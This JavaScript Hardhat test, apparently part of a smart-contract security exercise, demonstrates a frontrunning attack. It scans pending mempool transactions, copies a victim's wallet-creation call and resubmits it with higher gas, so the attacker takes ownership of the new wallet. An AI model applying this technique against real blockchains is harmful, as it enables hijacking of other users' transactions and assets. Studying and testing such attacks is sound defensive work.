const { expect } = require('chai');
const { ethers } = require('hardhat');
const 
  {abi:WalletContractAbi}
 = require('../artifacts/contracts/Wallet.sol/Wallet.json');

describe('Frontrunning attack', () => {
  let owner, alice, attacker, factory;

  before(async () => {
    [owner, alice, attacker] = await ethers.getSigners();
    const Factory = await ethers.getContractFactory('FactoryContract');
    factory = await Factory.connect(owner).deploy();
  });

  it('Perform the Frontrunning Attack', async () => {
      const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('Something'));
      
      await factory.connect(alice).createWallet(salt);

      // getting all the txs in mempool
      const txs = await ethers.provider.send('eth_getBlockByNumber', [
        'pending',
        true,
      ]);

      // finding the tx
      const tx = txs.transactions.find(
        (tx) => tx.to === factory.address.toLowerCase()
      );

      // Send tx with more gas
      await attacker.sendTransaction({
        to: tx.to,
        data: tx.input,
        gasPrice: ethers.BigNumber.from(tx.gasPrice).add(100),
        gasLimit: ethers.BigNumber.from(tx.gas).add(100000),
      });

      // Mine all the transactions
      await ethers.provider.send('evm_mine', []);

      const addressOfWallet = await factory.walletOwner(attacker.address);
      const wallet = await ethers.getContractAt(
        WalletContractAbi,
        addressOfWallet,
        attacker
      );

      await ethers.provider.send('evm_mine', []);

      expect(await factory.walletOwner(alice.address)).to.eq(ethers.constants.AddressZero);
      expect(await wallet.owner()).to.eq(attacker.address);
      expect(await wallet.initialized()).to.eq(true)
  });
});
